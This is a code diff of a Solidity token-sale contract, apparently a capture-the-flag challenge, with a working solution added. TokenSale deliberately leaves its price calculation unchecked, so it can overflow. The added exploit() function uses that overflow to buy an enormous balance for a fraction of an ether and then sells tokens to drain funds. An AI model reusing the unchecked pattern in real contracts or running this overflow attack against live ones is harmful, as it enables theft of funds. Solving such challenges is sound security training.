@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
+
 contract TokenSale {
     mapping(address => uint256) public balanceOf;
     uint256 constant PRICE_PER_TOKEN = 1 ether;
@@ -18,6 +19,7 @@ contract TokenSale {
         unchecked {
             total += numTokens * PRICE_PER_TOKEN;
         }
+        
         require(msg.value == total);
 
         balanceOf[msg.sender] += numTokens;
@@ -28,6 +30,7 @@ contract TokenSale {
         require(balanceOf[msg.sender] >= numTokens);
 
         balanceOf[msg.sender] -= numTokens;
+        
         (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
         require(ok, "Transfer to msg.sender failed");
     }
@@ -39,6 +42,13 @@ contract ExploitContract {
 
     constructor(TokenSale _tokenSale) {
         tokenSale = _tokenSale;
+    }
+
+    function exploit() public {
+      uint256 numTokens = type(uint256).max / 1 ether + 1;
+      tokenSale.buy{value: 0.415992086870360064 ether}(numTokens);
+
+      tokenSale.sell(1);
     }
 
     receive() external payable {}
